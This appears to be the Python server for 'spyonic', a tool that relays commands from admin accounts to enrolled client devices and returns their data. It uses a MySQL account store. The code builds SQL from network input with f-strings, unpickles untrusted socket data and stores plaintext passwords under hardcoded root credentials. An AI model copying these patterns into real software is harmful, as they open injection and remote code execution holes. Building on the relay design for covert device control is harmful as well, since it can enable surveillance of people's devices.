import socket # for networking
import pickle # for converting data from and to bytes
import mysql.connector # database connection
import threading # multitasking
import time # for code to waiting
import random # random numbers
from datetime import datetime # get date and time


class server:
    def getip():# get the pc's ip address
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)# init the socket( udp conn)
        s.connect(("8.8.8.8", 80))# connecting to google
        ip = s.getsockname()[0]# retriving ip address from the socket object
        s.close()# closing socket
        return ip# returns ip
    
    def __init__(self,ip=getip(),port=6000): # code to run when starting the class
        self.ip = ip # define ip
        self.port = port # define port
        self.admins = {} # a dictionary to store admins online
        self.clients = {}# a dictionary to store clients online
        self.ev = [] # to store threading event variable to stop them properly
        self.status = True # Bool to state if the server is running or not
        self.dbstatus = True# Bool to state if database is being used or not

    def execdb(self,arg): # database connector function
        print(f'Executing:{arg}')
        while not self.dbstatus: # if db is already being used, if yes wait else continue
            time.sleep(0.2)# wait for 0.2 sec
        else:
            self.dbstatus = False # lock on the database
            try: # try connecting
                mycon = mysql.connector.connect(host='localhost',database='spyonic',user='root',password='root') # connecting mysql
                mycurs = mycon.cursor() #creating cursor
                try: #if connection succedded
                    mycurs.execute(arg) # execute command
                    data = mycurs.fetchall() # get data from db
                    mycon.commit()# commit to the changes made
                    mycon.close()# close the connection
                    self.dbstatus = True # unlocking db
                    return data # return data
                except Exception as e: #if executing command failed
                    mycon.close()# close conn
                    self.dbstatus = False #lock db
                    print('MySQLerror:',e) # printing error
                    self.stop()# stopping server
            except:# if connection failed
                print('Fixing Database')
                mycon = mysql.connector.connect(host='localhost',user='root',password='root')# connecting without specifing database
                mycurs = mycon.cursor()# create cursor
                mycurs.execute('create database if not exists spyonic') #creating database
                print('Recreated Database')
                mycurs.execute("create table if not exists spyonic.admins(id char(6) not NULL,status int default 0,email varchar(100) not NULL primary key,device_no int,subscription int not NULL default 0,validity date,password varchar(20))")# creating admin table
                mycurs.execute("create table if not exists spyonic.clients(id char(6) primary key not NULL, status int default 0,name varchar(20) default 'client', os varchar(10),last_online DATETIME,password varchar(20),email varchar(100) not NULL, FOREIGN KEY (email) REFERENCES spyonic.admins(email) ON DELETE CASCADE )")# creating client table
                print('Recreated Tables')
                mycon.close()# close connection
                self.dbstatus = True# unlocking db
                return self.execdb(arg) # executing the given command

    def change_client_status(self,clientid,status): # toggle the status of client
        self.execdb(f"update spyonic.clients set status={status} where id = {clientid}")# sql command

    def change_admin_status(self,adminid,status): # toggle the status of admin
        self.execdb(f"update spyonic.admins set status={status} where id = {adminid}") # sql command

    def setupserv(self): # geting the socket setup and listen
        print('Initiating Connection')
        self.server = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # init socket
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)# socket config
        self.server.bind((self.ip,self.port))# binding to givenip and port
        self.server.listen()# listining at that port and ip

    def clilistener(self,id,client,ev):# a function to handle clients connected
        while not ev.is_set():# a while loop to loop until the client disconnects
            try:# try reciving
                data = client.recv(8000)# 800 is buffer size i.e. 8000 bytes
                if data != b'': # if data is not empty
                    print('Relaying  Data')
                    data = pickle.loads(data)# converting data from bytes to dictionaty
                    print(data)# printing the recived data
                if type(data) == dict:# checkif data recived was a dictionart
                    if data['command'] == 'sendadmin':# checking if data was meant for admin
                        adminid = self.execdb(f"select id from spyonic.admins where email = (select email from spyonic.clients where id = '{id}')")[0][0]# getting the id of the admin
                        if str(adminid) in self.admins:# checking if admin is online
                            admin = self.admins[adminid]# getting the socket of admin
                            admin.sendall(pickle.dumps(data['data']))# sending data to admin

                    else:# if the command was not meant for admin
                        ev.set()# disconnect/ stop listening to thes client
            except:# if anything went wrong above
                print('hmm')
                ev.set()# stop this while loop
        else:# if the loop stopped
            self.change_client_status(id,0)# set the status of client as offline
            self.execdb(f"update spyonic.clients set last_online = '{str(datetime.today().strftime('%Y-%m-%d %H:%M:%S'))}' where id = {id}")# add the date it was last online
            client.close()# disconnect/close socket connection
            del self.clients[str(id)]# remove this clinets from 'clients online' dictionart

    def adminlistener(self,id,admin,ev):# a function that handles the admin connected
        while not ev.is_set():
            try:
                data = admin.recv(4096)
                if data != b'':
                    print('Recieving Command')
                    data = pickle.loads(data)
                    print(data)
                if type(data) == dict:
                        if data['command'] == 'sendclient':
                            print(self.clients)
                            if data['id'] in self.clients:
                                
                                cli = self.clients[data['id']]
                                print('Transmitting Data')
                                cli.sendall(pickle.dumps({'command':data['data']}))
                        elif data['command']=='status':
                            email = self.execdb(f"select email from spyonic.admins where id = '{id}'")[0][0]
                            clients = self.execdb(f"select id, name ,status ,os ,last_online from spyonic.clients where email='{email}'")
                            clidata = {}
                            for client in clients:
                                clidata[client[0]] = {'name':client[1],'status':client[2],'os':client[3],'last_online':str(client[4])}
                                print('Sent Data') 
                            admin.sendall(pickle.dumps(clidata))
                        else:
                            pass
            except Exception as e:
                print(e)
                ev.set()
        else:
            self.change_admin_status(id,0)
            print('Admin Disconnected')
            admin.close()
            del self.admins[str(id)]

    def accepter(self):
        while self.status:
            try:
                cli , addr = self.server.accept()
                cli.send('namex'.encode())
                data = pickle.loads(cli.recv(2048))
                if data['type'] == 'admin':
                    x = ['idk']
                    if data['user'] == 'register':
                        while x != []:
                            id = random.randint(100000,999999)
                            x = self.execdb(f"select * from spyonic.admins where id = '{id}'")
                        y = self.execdb(f"select * from spyonic.admins where email='{data['email']}'")
                        print('Admin Trying To Register')
                        if y == []:
                            print('New Admin Registering')
                            self.execdb(f"insert into spyonic.admins values('{id}',0,'{data['email']}',0,0,NULL,'{data['password']}')")
                            print('New Admin Registered')
                            cli.send(pickle.dumps({'id':id,'error':None}))
                            cli.close()
                        else:
                            print('Admin Failed To Register, Email Already In Use')
                            cli.send(pickle.dumps({'id':None,'error':'Email in use'}))
                            cli.close()
                    elif data['user'] == 'login':
                        passwd = self.execdb(f"select password from spyonic.admins where email = '{data['email']}'")
                        print(passwd,data)
                        if passwd != []:
                            if passwd[0][0] == data['password']:
                                id = self.execdb(f"select id from spyonic.admins where email = '{data['email']}'")[0][0]
                                cli.send(pickle.dumps({'id':id,'error':None}))
                                self.change_admin_status(data['id'],1)
                                adm_ev = threading.Event()
                                t = threading.Thread(target=self.adminlistener,args=(data['id'],cli,adm_ev),daemon=True)
                                t.start()
                                print(f"Admin Connected\nIP:{addr},Email:{data['email']}")
                                self.admins[str(data['id'])] = cli
                            else:
                                cli.send(pickle.dumps({'id':None,'error':'Incorrect Password'}))
                                cli.close()
                        else:
                            cli.send(pickle.dumps({'id':None,'error':'No Email Found'}))
                            cli.close()


                elif data['type'] == 'client':
                    if data['user']=='register':
                        x = ['idk']
                        while x != []:
                            id = random.randint(100000,999999)
                            x = self.execdb(f"select * from spyonic.clients where id = '{id}'")
                        y = self.execdb(f"select id from spyonic.admins where email='{data['email']}'")
                        print('Client Trying To Register')
                        if y != []:
                            y = y[0]
                            print('Registering Client')
                            self.execdb(f"insert into spyonic.clients values('{id}',0,'{data['name']}','{data['os']}',NULL,'{data['password']}','{data['email']}')")
                            print('Registered Client')
                            cli.send(pickle.dumps({'error':None,'id':id}))
                            self.execdb(f"update spyonic.admins set device_no = device_no + 1 where id = '{y[0]}'")
                            cli.close()
                        else:
                            cli.send(pickle.dumps({'error':'Email not available','id':None}))
                            print('Client Failed To Register')
                            cli.close()
                    elif data['user'] == 'login':
                        passwd = self.execdb(f"select password from spyonic.clients where id = '{data['id']}'")[0]
                        if passwd[0] == data['password']:
                            cli.send(pickle.dumps({'id':data['id'],'error':None}))
                            
                        else:
                            cli.send(pickle.dumps({'id':None,'error':'Incorrect Password'}))
                            cli.close()
                    elif data['user'] == 'connecting':
                        if data['status'] == True:
                            cli.send(pickle.dumps({'id':data['id'],'error':None}))
                            self.change_client_status(data['id'],1)
                            print(f"Client connected\nIP:{addr},email:{data['email']}")
                            cli_ev = threading.Event()
                            t = threading.Thread(target=self.clilistener,args=(data['id'],cli,cli_ev),daemon=True)
                            t.start()
                            self.clients[str(data['id'])] = cli
                            cli = ''
                        else:
                            cli.send(pickle.dumps({'id':None,'error':'Not Logged In'}))
                            cli.close() 
                else:
                    cli.close()
            except:
                pass

    def start(self):
        print('Starting Server')
        self.setupserv()
        self.execdb('update spyonic.clients set status=0')
        self.execdb('update spyonic.admins set status=0')
        print('IP:',self.ip)
        print('PORT:',self.port)
        t = threading.Thread(target=self.accepter,daemon=True)
        t.start()
        while self.status:
            time.sleep(5)

    def stop(self):
        print('Stopping Server')
        for i in self.ev:
            i.set()
        self.status = False
